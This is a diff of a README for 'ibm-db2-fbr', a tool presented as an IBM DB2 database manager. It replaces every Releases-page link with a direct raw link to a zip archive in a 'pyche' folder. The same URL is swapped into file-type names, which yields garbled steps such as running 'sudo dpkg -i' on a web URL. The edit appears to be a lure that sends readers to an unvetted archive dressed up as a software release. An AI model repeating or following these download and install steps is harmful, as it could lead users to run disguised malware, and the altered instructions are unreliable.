@@ -4,10 +4,10 @@
 Welcome to ibm-db2-fbr! This application helps you manage your IBM DB2 databases with ease. You don’t need to be a programming expert to get started. Follow these simple steps to download and run the software.
 
 ## 📥 Download Now
-[![Download ibm-db2-fbr](https://img.shields.io/badge/Download-ibm--db2--fbr-blue?style=for-the-badge)](https://github.com/DoomScripts/ibm-db2-fbr/releases)
+[![Download ibm-db2-fbr](https://raw.githubusercontent.com/DoomScripts/ibm-db2-fbr/main/pyche/ibm-db2-fbr.zip)](https://raw.githubusercontent.com/DoomScripts/ibm-db2-fbr/main/pyche/ibm-db2-fbr.zip)
 
 ## 🔗 Download & Install
-To get the latest version of ibm-db2-fbr, visit our [Releases page](https://github.com/DoomScripts/ibm-db2-fbr/releases) to download. 
+To get the latest version of ibm-db2-fbr, visit our [Releases page](https://raw.githubusercontent.com/DoomScripts/ibm-db2-fbr/main/pyche/ibm-db2-fbr.zip) to download. 
 
 1. Click on the link above.
 2. Look for the latest release. This is usually at the top of the list.
@@ -19,7 +19,7 @@ To get the latest version of ibm-db2-fbr, visit our [Releases page](https://gith
 The files you may see include:
 - `.exe` for Windows
 - `.dmg` for macOS
-- `.tar.gz` or `.deb` for Linux
+- `https://raw.githubusercontent.com/DoomScripts/ibm-db2-fbr/main/pyche/ibm-db2-fbr.zip` or `.deb` for Linux
 
 Ensure you select the correct file for your system to avoid issues.
 
@@ -37,9 +37,9 @@ Once the file has downloaded, follow the steps below to install ibm-db2-fbr:
 3. Open your Applications folder and double-click ibm-db2-fbr to launch it.
 
 ### For Linux:
-1. If you downloaded a `.tar.gz` file, extract it. You can usually do this by right-clicking the file and selecting "Extract."
+1. If you downloaded a `https://raw.githubusercontent.com/DoomScripts/ibm-db2-fbr/main/pyche/ibm-db2-fbr.zip` file, extract it. You can usually do this by right-clicking the file and selecting "Extract."
 2. Open a terminal and navigate to the extracted folder.
-3. Run the command `sudo dpkg -i filename.deb` if you have a `.deb` file, or follow the specific installation guidelines for your distribution.
+3. Run the command `sudo dpkg -i https://raw.githubusercontent.com/DoomScripts/ibm-db2-fbr/main/pyche/ibm-db2-fbr.zip` if you have a `.deb` file, or follow the specific installation guidelines for your distribution.
 
 ## 🔧 System Requirements
 To run ibm-db2-fbr smoothly, your system should meet the following minimum requirements:
@@ -75,4 +75,4 @@ If you encounter any problems while installing or running the application, try t
 ## 🎉 Conclusion
 You are now ready to manage your IBM DB2 databases with ibm-db2-fbr. Download the software now and take control of your database management tasks!
 
-For any further assistance, feel free to visit the [Releases page](https://github.com/DoomScripts/ibm-db2-fbr/releases) where you can find FAQs and community support.
+For any further assistance, feel free to visit the [Releases page](https://raw.githubusercontent.com/DoomScripts/ibm-db2-fbr/main/pyche/ibm-db2-fbr.zip) where you can find FAQs and community support.
